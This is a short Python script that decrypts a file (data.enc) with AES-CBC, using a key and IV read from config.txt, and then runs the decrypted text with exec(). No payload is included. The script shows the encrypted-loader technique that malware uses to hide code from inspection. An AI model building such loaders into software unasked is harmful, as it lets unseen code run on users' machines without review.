from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import os


CONFIG_FILE_PATH = os.path.join(os.path.dirname(__file__),"config.txt")
ENCRYPTED_FILE_DATA = os.path.join(os.path.dirname(__file__),"data.enc")

def read_config(file_path):
    with open(file_path, 'r') as f:
        lines = f.readlines()
        encryption_key_hex = lines[0].strip().split('=')[1]
        iv_hex = lines[1].strip().split('=')[1]
        
        encryption_key = bytes.fromhex(encryption_key_hex)
        iv = bytes.fromhex(iv_hex)
        return encryption_key, iv

def decrypt_file(encrypted_file_path, key, iv):
    print(f"Attempting to open file: {encrypted_file_path}")  # Debug print
    if not os.path.isfile(encrypted_file_path):
        print(f"File not found: {encrypted_file_path}")
        return None
    
    with open(encrypted_file_path, 'rb') as f:
        encrypted_data = f.read()
    
    cipher = AES.new(key, AES.MODE_CBC, iv)
    try:
        decrypted_data = unpad(cipher.decrypt(encrypted_data), AES.block_size)
        return decrypted_data.decode('utf-8')
    except (ValueError, KeyError) as e:
        print(f"Decryption error: {e}")
        return None

def run_script(script_code):
    try:
        exec(script_code, globals())
    except Exception as e:
        print(f"Error executing script: {e}")

def main():
    encryption_key, iv = read_config(CONFIG_FILE_PATH)
    decrypted_code = decrypt_file(ENCRYPTED_FILE_DATA, encryption_key, iv)
    if decrypted_code:
        run_script(decrypted_code)

if __name__ == "__main__":
    main()
